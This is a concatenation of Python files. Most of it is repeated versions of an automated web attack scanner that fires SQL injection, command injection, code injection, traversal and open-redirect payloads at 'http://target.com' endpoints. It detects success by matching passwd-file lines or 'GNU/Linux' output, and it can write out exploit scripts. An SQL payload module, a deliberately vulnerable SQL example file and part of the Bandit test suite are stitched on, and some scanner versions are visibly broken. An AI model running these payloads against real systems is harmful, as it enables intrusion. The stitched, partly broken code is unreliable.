open_redirect = "Open Redirect"
cross_site_request_forgery = "Cross Site Request Forgery"
shell_command = "Shell Command Injection"

def injectPayload(url, paramname, method, payload, verbose = False):
	parsedURL = BASE_URL + url	
	html = ""

	
	#if get
	if method == "GET":
		getURL = parsedURL + "?" + paramname+"="+payload[0]
		content = requests.get(getURL)
		html =  content.text

	#if post
	elif method == "POST":
		content = requests.post(parsedURL, data={paramname:payload[0]})
		html = content.text

	result = checkSuccess(html, payload[1], content, parsedURL, method, paramname, verbose)
	
	#if function returns:
	if result is not None:
		print payload
		#generateExploit(parsedURL, method, paramname, payload)
		return payload
	return None

def timeid(full=False):
	if full==False:
		return datetime.now().strftime("%S-%f")
	else:
		return datetime.now().strftime("%H-%M-%S-%f") 

def generateExploit(url, method, paramname, payload):
#payload is a "payload, type_of_payload" list

	dirname = "exploits/"
	if not os.path.exists(dirname):
		os.makedirs(dirname)

	copy("exploit.py", dirname)

	f = open(dirname + payload[1] + "_" + timeid() + ".sh","w+")
	f.write("python exploit.py " + '"' + url +'" ' + method + " "+ paramname + ' "' +payload[0]+'"')
	


def checkSuccess(html, attackType, content, url, method, paramname, v=False):
	if v == True:
		print html

	#===== check for directory traversal =====
	if attackType == directory_traversal:
		match = re.findall(r'\w*\:\w\:[0-9]*\:[0-9]*\:[a-zA-Z_-]*\:[\/a-zA-Z0-9]*[ \t]?:[\/a-zA-Z0-9]*', html)
		if len(match) == 0:
			return None
		return match

	#======= check for shell command injection ======
	if attackType == shell_command:
		match = re.findall(r'GNU/Linux', html)
		if len(match) == 0:
			return None
		return match

	#===== check for sql_injection ======
	if attackType == sql_injection:
		
		falsePayload = sqli.get_false()
		#if get
		if method == "GET":
			getURL = parsedURL + "?" + paramname+"="+falsePayload
			content = requests.get(getURL)
			badhtml =  content.text
		#if post
		elif method == "POST":
			content = requests.post(url, data={paramname:falsePayload})
			badhtml = content.text

		compare_res = sqli.compare_html(badhtml, html)		
		match = re.findall(r'<ins>.+', compare_res)
		if len(match) ==0 :
			return None
		return match

	#====== check for open_redirect=======
	if attackType == open_redirect:
		if len(content.history) > 0 and content.url == "https://status.github.com/messages":
			return True

	
	#=======check for server_injection ====
	if attackType == server_injection:
		#included index.php
		indexPHP = requests.get(BASE_URL + "/index.php")

		if indexPHP.text in html:
			return attackType
		#uname -a successful:
		if "GNU/Linux" in html:
			return attackType

	return None;
	

if __name__ == "__main__":
	## test directory shell
    # url = '/directorytraversal/directorytraversal.php'
    # payloads = dirtraversal.get_all()

    # for payload in payloads:                    
    #     ## need param after endpoint ?param=
        
    #     injectPayload(url, 'ascii', 'GET', payload)


	# ## test shell command
	# ## post in the form
	# url = "/commandinjection/commandinjection.php"
	# payloads = cmd.get_all()
	# for payload in payloads:                    
	# 	injectPayload(url, "host", 'POST', payload)

	#sqli
	# post in the form
	#url = "/sqli/sqli.php"
	#payloads = sqli.get_all()
	#for payload in payloads:                    
	#	injectPayload(url, "username", "POST", payload)

	#Test for server side code injection
	url = "/serverside/eval2.php"                    
	payloads = ssci.get_all(url)                    
	for payload in payloads:                    
		injectPayload(url, "page", "POST", payload)                    
	'''
	#test for open redirect
	url = "/openredirect/openredirect.php"
	orPayload = oRedirect.get_all()
	for payload in orPayload:
	 	injectPayload(url, "redirect", "GET", payload)
	'''

import difflib

def get_false():
	payloads = ["' and ' 1=2"]
	return payloads

def get_all():
	payloads = ["' or '1=1"]                    
	payloads = [(item, "SQL Injection") for item in payloads]
	return payloads	

def compare_html(html1, html2):
	diff_html = ""
	diffs = difflib.ndiff(html1.splitlines(), html2.splitlines())
	for ele in diffs:
		if (ele[0] == "-"):
			diff_html += "<del>%s</del>" % ele[1:].strip()
		elif(ele[0] == "+"):
			diff_html += "<ins>%s</ins>" %ele[1:].strip()

	return diff_html

if __name__ == "__main__":	
	print get_all()

import requests
import ssci
import oRedirect 
import os
import re 
import sqli
import cmd
import dirtraversal
from shutil import copy,rmtree
from datetime import datetime
import difflib


BASE_URL = "http://target.com"
sql_injection = "SQL Injection"
server_injection = "Server Side Code Injection"
directory_traversal = "Directory Traversal"
open_redirect = "Open Redirect"
cross_site_request_forgery = "Cross Site Request Forgery"
shell_command = "Shell Command Injection"

def injectPayload(url, method, paramname, payload, verbose = False):
	parsedURL = BASE_URL + url	
	html = ""

	#if get
	if method == "GET":                    
		getURL = parsedURL + "?" + paramname+"="+payload[0]
		content = requests.get(getURL)                    
		html =  content.text

	#if post
	elif method == "POST":                    
		content = requests.post(parsedURL, data={paramname:payload[0]})
		html = content.text


	result = checkSuccess(html, payload[1], content, parsedURL, method, paramname, verbose)
	
	#if function returns:
	if result is not None:
		#generateExploit(parsedURL, method, paramname, payload)
		return True
	return None                    

def timeid(full=False):
	if full==False:
		return datetime.now().strftime("%S-%f")
	else:
		return datetime.now().strftime("%H-%M-%S-%f") 

def generateExploit(url, method, paramname, payload):
#payload is a "payload, type_of_payload" list

	dirname = "exploits/"
	if not os.path.exists(dirname):
		os.makedirs(dirname)

	copy("exploit.py", dirname)

	f = open(dirname + payload[1] + "_" + timeid() + ".sh","w+")
	f.write("python exploit.py " + '"' + url +'" ' + method + " "+ paramname + ' "' +payload[0]+'"')
	


def checkSuccess(html, attackType, content, url, method, paramname, v=False):
	if v == True:
		print html

	#===== check for directory traversal =====
	if attackType == directory_traversal:
		match = re.findall(r'\w*\:\w\:[0-9]*\:[0-9]*\:[a-zA-Z_-]*\:[\/a-zA-Z0-9]*[ \t]?:[\/a-zA-Z0-9]*', html)
		if len(match) == 0:
			return None                    
		return match

	#======= check for shell command injection ======
	if attackType == shell_command:
		match = re.findall(r'GNU/Linux', html)
		if len(match) == 0:
			return None                    
		return match

	#===== check for sql_injection ======
	if attackType == sql_injection:
		
		falsePayload = sqli.get_false()[0]
		badhtml = ""                    
		#if get
		if method == "GET":                    
			getURL = url + "?" + paramname+"="+falsePayload                    
			content = requests.get(getURL)                    
			badhtml =  content.text                    
		#if post
		elif method == "POST":                    
			content = requests.post(url, data={paramname:falsePayload})                    
			badhtml = content.text                    

		compare_res = sqli.compare_html(badhtml, html)		                    
		match = re.findall(r'<ins>.+', compare_res)
		if len(match) ==0 :
			return None                    
		return None                    

	#====== check for open_redirect=======
	if attackType == open_redirect:
		if len(content.history) > 0 and content.url == "https://status.github.com/messages":
			return True

	
	#=======check for server_injection ====
	if attackType == server_injection:
		#included index.php
		indexPHP = requests.get(BASE_URL + "/index.php")

		if indexPHP.text in html:
			return attackType
		#uname -a successful:
		if "GNU/Linux" in html:
			return attackType

	return None;                    
	
def get_payloads(v=False):
	payloads = cmd.get_all() +sqli.get_all() + ssci.get_all() + oRedirect.get_all() + dirtraversal.get_all()

	if v == True:
		for p in payloads:
			print p[0]

	return payloads


if __name__ == "__main__":
	get_payloads(v=True)                    

	## test directory shell
    # url = '/directorytraversal/directorytraversal.php'
    # payloads = dirtraversal.get_all()

    # for payload in payloads:
    #     ## need param after endpoint ?param=
        
    #     injectPayload(url, 'ascii', 'GET', payload)


	# ## test shell command
	# ## post in the form
	# url = "/commandinjection/commandinjection.php"
	# payloads = cmd.get_all()
	# for payload in payloads:
	# 	injectPayload(url, "host", 'POST', payload)

	#sqli
	# post in the form
	#url = "/sqli/sqli.php"
	#payloads = sqli.get_all()
	#for payload in payloads:
	#	injectPayload(url, "username", "POST", payload)

	#Test for server side code injection
	# url = "/serverside/eval2.php"
	# payloads = ssci.get_all(url)
	# for payload in payloads:
	# 	injectPayload(url, "page", "POST", payload)
	'''
	#test for open redirect
	url = "/openredirect/openredirect.php"
	orPayload = oRedirect.get_all()
	for payload in orPayload:
	 	injectPayload(url, "redirect", "GET", payload)                    
	'''

import requests
import json
import ssci
import oRedirect 
import os
import re 
import sqli
import cmd
import dirtraversal
from shutil import copy,rmtree
from datetime import datetime
import difflib
import collections

BASE_URL = "http://target.com"
sql_injection = "SQL Injection"
server_injection = "Server Side Code Injection"
directory_traversal = "Directory Traversal"
open_redirect = "Open Redirect"
cross_site_request_forgery = "Cross Site Request Forgery"
shell_command = "Shell Command Injection"

class AutoDict(dict):
    def __getitem__(self, item):
        try:
            return dict.__getitem__(self, item)
        except KeyError:
            value = self[item] = type(self)()
            return value

final_output=[]
vul_list = []
vul_classes = AutoDict()

def format_vul_list():
    sorted_list = sorted(vul_list, key=lambda x: x[2][1])
    print(sorted_list)

## write to json file if possible
def write_file(url, paramname, payload, method):
    ## initialize dict
    sub_elements = AutoDict()
    lists = []
    sub_elements['endpoint']= url
    sub_elements['params']['key1']= payload[0]
    sub_elements['method'] = method
    # update current dict
    if(vul_classes.get('class')==payload[1]):
        lists = vul_classes['results'][BASE_URL]

        for ele in lists:
            if (ele['endpoint'] == url) and (ele['params']['key1']==payload[0]) and (ele['method']==method) :
                continue
            else:
                lists.append(sub_elements)
         
        vul_classes['results'][BASE_URL]=lists

    else:
        vul_classes['class'] = payload[1]        
        lists.append(sub_elements)
        vul_classes['results'][BASE_URL]=lists



def injectPayload(url, paramname, method, payload, verbose = False):
    parsedURL = BASE_URL + url  
    html = ""

    #if get
    if method == "GET":
        getURL = parsedURL + "?" + paramname+"="+payload[0]
        content = requests.get(getURL)
        html =  content.text

    #if post
    elif method == "POST":
        content = requests.post(parsedURL, data={paramname:payload[0]})
        html = content.text

    result = checkSuccess(html, payload[1], content, parsedURL, method, paramname, verbose)
    
    #if function returns:
    if result is not None:
        print(url, payload)
        vul_list.append([url, paramname, payload, method])

        #generateExploit(parsedURL, method, paramname, payload)
        return True
    return None

def timeid(full=False):
    if full==False:
        return datetime.now().strftime("%S-%f")
    else:
        return datetime.now().strftime("%H-%M-%S-%f") 

def generateExploit(url, method, paramname, payload):
#payload is a "payload, type_of_payload" list

    dirname = "exploits/"
    if not os.path.exists(dirname):
        os.makedirs(dirname)

    copy("exploit.py", dirname)

    f = open(dirname + payload[1] + "_" + timeid() + ".sh","w+")
    f.write("python exploit.py " + '"' + url +'" ' + method + " "+ paramname + ' "' +payload[0]+'"')
    


def checkSuccess(html, attackType, content, url, method, paramname, v=False):
    if v == True:
        print html

    #===== check for directory traversal =====
    if attackType == directory_traversal:
        match = re.findall(r'\w*\:\w\:[0-9]*\:[0-9]*\:[a-zA-Z_-]*\:[\/a-zA-Z0-9]*[ \t]?:[\/a-zA-Z0-9]*', html)
        if len(match) == 0:
            return None
        return match

    #======= check for shell command injection ======
    if attackType == shell_command:
        match = re.findall(r'GNU/Linux', html)
        if len(match) == 0:
            return None
        return match

    #===== check for sql_injection ======
    if attackType == sql_injection:
        ## for real sql injection, the payloads should return the same result
        ## then compare the fake page with the true page to see the difference
        falsePayloads = sqli.get_false()
        #if get
        badhtml = []
        for falsePayload in falsePayloads:
            if method == "GET":
                getURL = url + "?" + paramname+"="+falsePayload
                false_page = requests.get(getURL)
                if(false_page.status_code==200):
                    badhtml.append(false_page.text)
                else:
                    badhtml.append(requests.get(url).text)
            #if post
            elif method == "POST":
                false_page = requests.post(url, data={paramname:falsePayload})
                if(false_page.status_code==200):
                    badhtml.append(false_page.text)
                    # print(html)
                else:
                    badhtml.append(requests.get(url).text)

        if(content.status_code==200) and badhtml[1]==html:
            compare_res = sqli.compare_html(badhtml[0], html)  
            match = re.findall(r'<ins>.+', compare_res)

        else:
            match = ""
        if len(match) ==0 :
            return None

        return match

    #====== check for open_redirect=======
    if attackType == open_redirect:
        if len(content.history) > 0 and content.url == "https://status.github.com/messages":
            return True

    
    #=======check for server_injection ====
    if attackType == server_injection:
        #included index.php
        indexPHP = requests.get(BASE_URL + "/index.php")

        if indexPHP.text in html:
            return attackType
        #uname -a successful:
        if "GNU/Linux" in html:
            return attackType

    return None;
    
def get_payloads(v=False):
    payloads = cmd.get_all() +sqli.get_all() + ssci.get_all() + oRedirect.get_all() + dirtraversal.get_all()

    if v == True:
        for p in payloads:
            print p[0]

    return payloads


if __name__ == "__main__":
    # get_payloads(v=True)

    payloads = get_payloads()                    
    url_list = ['/directorytraversal/directorytraversal.php',
                "/commandinjection/commandinjection.php",
                "/sqli/sqli.php",
                "/serverside/eval2.php",
                "/openredirect/openredirect.php"]
    for payload in payloads:
        injectPayload(url_list[0], 'ascii', 'GET', payload)                    
        injectPayload(url_list[1], "host", 'POST', payload)                    
        injectPayload(url_list[2], "username", "POST", payload)
        injectPayload(url_list[3], "page", "POST", payload)
        injectPayload(url_list[4], "redirect", "GET", payload)

    # with open('exploits/test.json', 'w') as f:
    #     json.dump(final_output, f)

    # format_lu_list()
    ## test directory shell
    # url = '/directorytraversal/directorytraversal.php'
    # payloads = dirtraversal.get_all()

    # for payload in payloads:
    #     ## need param after endpoint ?param=
        
    #     injectPayload(url, 'ascii', 'GET', payload)


    # ## test shell command
    # ## post in the form
    # url = "/commandinjection/commandinjection.php"
    # payloads = cmd.get_all()
    # for payload in payloads:
    #   injectPayload(url, "host", 'POST', payload)

    #sqli
    # post in the form
    #url = "/sqli/sqli.php"
    #payloads = sqli.get_all()
    #for payload in payloads:
    #   injectPayload(url, "username", "POST", payload)

    #Test for server side code injection
    # url = "/serverside/eval2.php"
    # payloads = ssci.get_all(url)
    # for payload in payloads:
    #   injectPayload(url, "page", "POST", payload)
    '''
    #test for open redirect
    url = "/openredirect/openredirect.php"
    orPayload = oRedirect.get_all()
    for payload in orPayload:
        injectPayload(url, "redirect", "GET", payload)
    '''

import difflib

"""
Solutions:
1. compare pages only  
match = re.findall(r'<pre>', html)

2. add false page to compare
match = re.findall(r'<ins>.+', compare_res)

3. add another label "' or '1'='1" as ground truth
Assumption: should be the same page for sql injection, different with false page
"""

def get_false():
	## the second is taken as ground truth to filter out real sql-injection page
	payloads = ["' and '1=2", "' or '1'='1"]
	return payloads

# def get_false():
# 	payloads = "' and '1=2"
# 	return payloads

def get_all():
	"""
	Consider different db types and versions
	-- MySQL, MSSQL, Oracle, PostgreSQL, SQLite
	' OR '1'='1' --
	' OR '1'='1' /*
	-- MySQL
	' OR '1'='1' #
	-- Access (using null characters)
	' OR '1'='1' %00
	' OR '1'='1' %16
	"""
	## temp test
	# payloads = ["' or '1=1"]
	payloads = ["' or '1=1",   "'1 'or' 1'='1","' or '1'='1",  "'or 1=1#", "' OR '1=1 %00"]                    
	payloads = [(item, "SQL Injection") for item in payloads]
	return payloads	

def compare_html(html1, html2):
	diff_html = ""
	diffs = difflib.ndiff(html1.splitlines(), html2.splitlines())
	for ele in diffs:
		if (ele[0] == "-"):
			diff_html += "<del>%s</del>" % ele[1:].strip()
		elif(ele[0] == "+"):
			diff_html += "<ins>%s</ins>" %ele[1:].strip()

	return diff_html

if __name__ == "__main__":	
	print get_all()

import requests
import json
import ssci
import oRedirect 
import os
import re 
import sqli
import cmd
import dirtraversal
from shutil import copy,rmtree
from datetime import datetime
import difflib
import collections

BASE_URL = "http://target.com"
sql_injection = "SQL Injection"
server_injection = "Server Side Code Injection"
directory_traversal = "Directory Traversal"
open_redirect = "Open Redirect"
cross_site_request_forgery = "Cross Site Request Forgery"
shell_command = "Shell Command Injection"

class AutoDict(dict):
    def __getitem__(self, item):
        try:
            return dict.__getitem__(self, item)
        except KeyError:
            value = self[item] = type(self)()
            return value

final_output=[]
vul_list = []
vul_classes = AutoDict()

def format_vul_list():
    sorted_list = sorted(vul_list, key=lambda x: x[2][1])
    print(sorted_list)

## write to json file if possible
def write_file(url, paramname, payload, method):
    ## initialize dict
    sub_elements = AutoDict()
    lists = []
    sub_elements['endpoint']= url
    sub_elements['params']['key1']= payload[0]
    sub_elements['method'] = method
    # update current dict
    if(vul_classes.get('class')==payload[1]):
        lists = vul_classes['results'][BASE_URL]

        for ele in lists:
            if (ele['endpoint'] == url) and (ele['params']['key1']==payload[0]) and (ele['method']==method) :
                continue
            else:
                lists.append(sub_elements)
         
        vul_classes['results'][BASE_URL]=lists

    else:
        vul_classes['class'] = payload[1]        
        lists.append(sub_elements)
        vul_classes['results'][BASE_URL]=lists



def injectPayload(url, paramname, method, payload, verbose = False):
    parsedURL = BASE_URL + url  
    html = ""

    #if get
    if method == "GET":
        getURL = parsedURL + "?" + paramname+"="+payload[0]
        content = requests.get(getURL)
        html =  content.text

    #if post
    elif method == "POST":
        content = requests.post(parsedURL, data={paramname:payload[0]})
        html = content.text

    result = checkSuccess(html, payload[1], content, parsedURL, method, paramname, verbose)
    
    #if function returns:
    if result is not None:
        print(url, payload)
        vul_list.append([url, paramname, payload, method])

        #generateExploit(parsedURL, method, paramname, payload)
        return True
    return None

def timeid(full=False):
    if full==False:
        return datetime.now().strftime("%S-%f")
    else:
        return datetime.now().strftime("%H-%M-%S-%f") 

def generateExploit(url, method, paramname, payload):
#payload is a "payload, type_of_payload" list

    dirname = "exploits/"
    if not os.path.exists(dirname):
        os.makedirs(dirname)

    copy("exploit.py", dirname)

    f = open(dirname + payload[1] + "_" + timeid() + ".sh","w+")
    f.write("python exploit.py " + '"' + url +'" ' + method + " "+ paramname + ' "' +payload[0]+'"')
    


def checkSuccess(html, attackType, content, url, method, paramname, v=False):
    if v == True:
        print html

    #===== check for directory traversal =====
    if attackType == directory_traversal:
        match = re.findall(r'\w*\:\w\:[0-9]*\:[0-9]*\:[a-zA-Z_-]*\:[\/a-zA-Z0-9]*[ \t]?:[\/a-zA-Z0-9]*', html)
        if len(match) == 0:
            return None
        return match

    #======= check for shell command injection ======
    if attackType == shell_command:
        match = re.findall(r'GNU/Linux', html)
        if len(match) == 0:
            return None
        return match

    #===== check for sql_injection ======
    if attackType == sql_injection:
        ## for real sql injection, the payloads should return the same result
        ## then compare the fake page with the true page to see the difference
        falsePayloads = sqli.get_false()
        #if get
        badhtml = []
        for falsePayload in falsePayloads:
            if method == "GET":
                getURL = url + "?" + paramname+"="+falsePayload
                false_page = requests.get(getURL)
                if(false_page.status_code==200):
                    badhtml.append(false_page.text)
                else:
                    badhtml.append(requests.get(url).text)
            #if post
            elif method == "POST":
                false_page = requests.post(url, data={paramname:falsePayload})
                if(false_page.status_code==200):
                    badhtml.append(false_page.text)
                    # print(html)
                else:
                    badhtml.append(requests.get(url).text)

        if(content.status_code==200) and badhtml[1]==html:                    
            compare_res = sqli.compare_html(badhtml[0], html)  
            match = re.findall(r'<ins>.+', compare_res)

        else:
            match = ""
        if len(match) ==0 :
            return None

        return match

    #====== check for open_redirect=======
    if attackType == open_redirect:
        if len(content.history) > 0 and content.url == "https://status.github.com/messages":
            return True

    
    #=======check for server_injection ====
    if attackType == server_injection:
        #included index.php
        indexPHP = requests.get(BASE_URL + "/index.php")

        if indexPHP.text in html:
            return attackType
        #uname -a successful:
        if "GNU/Linux" in html:
            return attackType

    return None;
    
def get_payloads(v=False):
    payloads = cmd.get_all() +sqli.get_all() + ssci.get_all() + oRedirect.get_all() + dirtraversal.get_all()

    if v == True:
        for p in payloads:
            print p[0]

    return payloads


if __name__ == "__main__":
    # get_payloads(v=True)

    payloads = sqli.get_all()
    url_list = ['/directorytraversal/directorytraversal.php',
                "/commandinjection/commandinjection.php",
                "/sqli/sqli.php",
                "/serverside/eval2.php",
                "/openredirect/openredirect.php"]
    for payload in payloads:
        # injectPayload(url_list[0], 'ascii', 'GET', payload)
        # injectPayload(url_list[1], "host", 'POST', payload)
        injectPayload(url_list[2], "username", "POST", payload)
        injectPayload(url_list[3], "page", "POST", payload)
        injectPayload(url_list[4], "redirect", "GET", payload)

    # with open('exploits/test.json', 'w') as f:
    #     json.dump(final_output, f)

    # format_lu_list()
    ## test directory shell
    # url = '/directorytraversal/directorytraversal.php'
    # payloads = dirtraversal.get_all()

    # for payload in payloads:
    #     ## need param after endpoint ?param=
        
    #     injectPayload(url, 'ascii', 'GET', payload)


    # ## test shell command
    # ## post in the form
    # url = "/commandinjection/commandinjection.php"
    # payloads = cmd.get_all()
    # for payload in payloads:
    #   injectPayload(url, "host", 'POST', payload)

    #sqli
    # post in the form
    #url = "/sqli/sqli.php"
    #payloads = sqli.get_all()
    #for payload in payloads:
    #   injectPayload(url, "username", "POST", payload)

    #Test for server side code injection
    # url = "/serverside/eval2.php"
    # payloads = ssci.get_all(url)
    # for payload in payloads:
    #   injectPayload(url, "page", "POST", payload)
    '''
    #test for open redirect
    url = "/openredirect/openredirect.php"
    orPayload = oRedirect.get_all()
    for payload in orPayload:
        injectPayload(url, "redirect", "GET", payload)
    '''

import sqlalchemy

# bad
query = "SELECT * FROM foo WHERE id = '%s'" % identifier
query = "INSERT INTO foo VALUES ('a', 'b', '%s')" % value
query = "DELETE FROM foo WHERE id = '%s'" % identifier
query = "UPDATE foo SET value = 'b' WHERE id = '%s'" % identifier
query = """WITH cte AS (SELECT x FROM foo)
SELECT x FROM cte WHERE x = '%s'""" % identifier

# bad
cur.execute("SELECT * FROM foo WHERE id = '%s'" % identifier)
cur.execute("INSERT INTO foo VALUES ('a', 'b', '%s')" % value)
cur.execute("DELETE FROM foo WHERE id = '%s'" % identifier)
cur.execute("UPDATE foo SET value = 'b' WHERE id = '%s'" % identifier)

# good
cur.execute("SELECT * FROM foo WHERE id = '%s'", identifier)
cur.execute("INSERT INTO foo VALUES ('a', 'b', '%s')", value)
cur.execute("DELETE FROM foo WHERE id = '%s'", identifier)
cur.execute("UPDATE foo SET value = 'b' WHERE id = '%s'", identifier)

# bad
query = "SELECT " + val + " FROM " + val +" WHERE id = " + val                    

# bad
cur.execute("SELECT " + val + " FROM " + val +" WHERE id = " + val)                    


# bug: https://bugs.launchpad.net/bandit/+bug/1479625
def a():
    def b():
        pass
    return b

a()("SELECT %s FROM foo" % val)

# real world false positives
choices=[('server_list', _("Select from active instances"))]
print("delete from the cache as the first argument")

# -*- coding:utf-8 -*-
#
# Copyright 2014 Hewlett-Packard Development Company, L.P.
#
# Licensed under the Apache License, Version 2.0 (the "License"); you may
# not use this file except in compliance with the License. You may obtain
# a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.

import os

import six
import testtools

from bandit.core import config as b_config
from bandit.core import constants as C
from bandit.core import manager as b_manager
from bandit.core import metrics
from bandit.core import test_set as b_test_set


class FunctionalTests(testtools.TestCase):

    '''Functional tests for bandit test plugins.

    This set of tests runs bandit against each example file in turn
    and records the score returned. This is compared to a known good value.
    When new tests are added to an example the expected result should be
    adjusted to match.
    '''

    def setUp(self):
        super(FunctionalTests, self).setUp()
        # NOTE(tkelsey): bandit is very sensitive to paths, so stitch
        # them up here for the testing environment.
        #
        path = os.path.join(os.getcwd(), 'bandit', 'plugins')
        b_conf = b_config.BanditConfig()
        self.b_mgr = b_manager.BanditManager(b_conf, 'file')
        self.b_mgr.b_conf._settings['plugins_dir'] = path
        self.b_mgr.b_ts = b_test_set.BanditTestSet(config=b_conf)

    def run_example(self, example_script, ignore_nosec=False):
        '''A helper method to run the specified test

        This method runs the test, which populates the self.b_mgr.scores
        value. Call this directly if you need to run a test, but do not
        need to test the resulting scores against specified values.
        :param example_script: Filename of an example script to test
        '''
        path = os.path.join(os.getcwd(), 'examples', example_script)
        self.b_mgr.ignore_nosec = ignore_nosec
        self.b_mgr.discover_files([path], True)
        self.b_mgr.run_tests()

    def check_example(self, example_script, expect, ignore_nosec=False):
        '''A helper method to test the scores for example scripts.

        :param example_script: Filename of an example script to test
        :param expect: dict with expected counts of issue types
        '''
        # reset scores for subsequent calls to check_example
        self.b_mgr.scores = []
        self.run_example(example_script, ignore_nosec=ignore_nosec)
        expected = 0
        result = 0
        for test_scores in self.b_mgr.scores:
            for score_type in test_scores:
                self.assertIn(score_type, expect)
                for rating in expect[score_type]:
                    expected += (
                        expect[score_type][rating] * C.RANKING_VALUES[rating]
                    )
                result += sum(test_scores[score_type])
        self.assertEqual(expected, result)

    def check_metrics(self, example_script, expect):
        '''A helper method to test the metrics being returned.

        :param example_script: Filename of an example script to test
        :param expect: dict with expected values of metrics
        '''
        self.b_mgr.metrics = metrics.Metrics()
        self.b_mgr.scores = []
        self.run_example(example_script)

        # test general metrics (excludes issue counts)
        m = self.b_mgr.metrics.data
        for k in expect:
            if k != 'issues':
                self.assertEqual(expect[k], m['_totals'][k])
        # test issue counts
        if 'issues' in expect:
            for (criteria, default) in C.CRITERIA:
                for rank in C.RANKING:
                    label = '{0}.{1}'.format(criteria, rank)
                    expected = 0
                    if expect['issues'].get(criteria, None).get(rank, None):
                        expected = expect['issues'][criteria][rank]
                    self.assertEqual(expected, m['_totals'][label])

    def test_binding(self):
        '''Test the bind-to-0.0.0.0 example.'''
        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'MEDIUM': 1}}
        self.check_example('binding.py', expect)

    def test_crypto_md5(self):
        '''Test the `hashlib.md5` example.'''
        expect = {'SEVERITY': {'MEDIUM': 11},
                  'CONFIDENCE': {'HIGH': 11}}
        self.check_example('crypto-md5.py', expect)

    def test_ciphers(self):
        '''Test the `Crypto.Cipher` example.'''
        expect = {'SEVERITY': {'HIGH': 13},
                  'CONFIDENCE': {'HIGH': 13}}
        self.check_example('ciphers.py', expect)

    def test_cipher_modes(self):
        '''Test for insecure cipher modes.'''
        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example('cipher-modes.py', expect)

    def test_eval(self):
        '''Test the `eval` example.'''
        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('eval.py', expect)

    def test_mark_safe(self):
        '''Test the `mark_safe` example.'''
        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example('mark_safe.py', expect)

    def test_exec(self):
        '''Test the `exec` example.'''
        filename = 'exec-{}.py'
        if six.PY2:
            filename = filename.format('py2')
            expect = {'SEVERITY': {'MEDIUM': 2}, 'CONFIDENCE': {'HIGH': 2}}
        else:
            filename = filename.format('py3')
            expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example(filename, expect)

    def test_exec_as_root(self):
        '''Test for the `run_as_root=True` keyword argument.'''
        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'MEDIUM': 5}}
        self.check_example('exec-as-root.py', expect)

    def test_hardcoded_passwords(self):
        '''Test for hard-coded passwords.'''
        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'MEDIUM': 7}}
        self.check_example('hardcoded-passwords.py', expect)

    def test_hardcoded_tmp(self):
        '''Test for hard-coded /tmp, /var/tmp, /dev/shm.'''
        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'MEDIUM': 3}}
        self.check_example('hardcoded-tmp.py', expect)

    def test_httplib_https(self):
        '''Test for `httplib.HTTPSConnection`.'''
        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('httplib_https.py', expect)

    def test_imports_aliases(self):
        '''Test the `import X as Y` syntax.'''
        expect = {
            'SEVERITY': {'LOW': 4, 'MEDIUM': 5, 'HIGH': 0},
            'CONFIDENCE': {'HIGH': 9}
        }
        self.check_example('imports-aliases.py', expect)

    def test_imports_from(self):
        '''Test the `from X import Y` syntax.'''
        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('imports-from.py', expect)

    def test_imports_function(self):
        '''Test the `__import__` function.'''
        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('imports-function.py', expect)

    def test_telnet_usage(self):
        '''Test for `import telnetlib` and Telnet.* calls.'''
        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('telnetlib.py', expect)

    def test_ftp_usage(self):
        '''Test for `import ftplib` and FTP.* calls.'''
        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('ftplib.py', expect)

    def test_imports(self):
        '''Test for dangerous imports.'''
        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('imports.py', expect)

    def test_mktemp(self):
        '''Test for `tempfile.mktemp`.'''
        expect = {'SEVERITY': {'MEDIUM': 4}, 'CONFIDENCE': {'HIGH': 4}}
        self.check_example('mktemp.py', expect)

    def test_nonsense(self):
        '''Test that a syntactically invalid module is skipped.'''
        self.run_example('nonsense.py')
        self.assertEqual(1, len(self.b_mgr.skipped))

    def test_okay(self):
        '''Test a vulnerability-free file.'''
        expect = {'SEVERITY': {}, 'CONFIDENCE': {}}
        self.check_example('okay.py', expect)

    def test_os_chmod(self):
        '''Test setting file permissions.'''
        filename = 'os-chmod-{}.py'
        if six.PY2:
            filename = filename.format('py2')
        else:
            filename = filename.format('py3')
        expect = {
            'SEVERITY': {'MEDIUM': 2, 'HIGH': 8},
            'CONFIDENCE': {'MEDIUM': 1, 'HIGH': 9}
        }
        self.check_example(filename, expect)

    def test_os_exec(self):
        '''Test for `os.exec*`.'''
        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}
        self.check_example('os-exec.py', expect)

    def test_os_popen(self):
        '''Test for `os.popen`.'''
        expect = {'SEVERITY': {'LOW': 8, 'MEDIUM': 0, 'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 9}}
        self.check_example('os-popen.py', expect)

    def test_os_spawn(self):
        '''Test for `os.spawn*`.'''
        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}
        self.check_example('os-spawn.py', expect)

    def test_os_startfile(self):
        '''Test for `os.startfile`.'''
        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'MEDIUM': 3}}
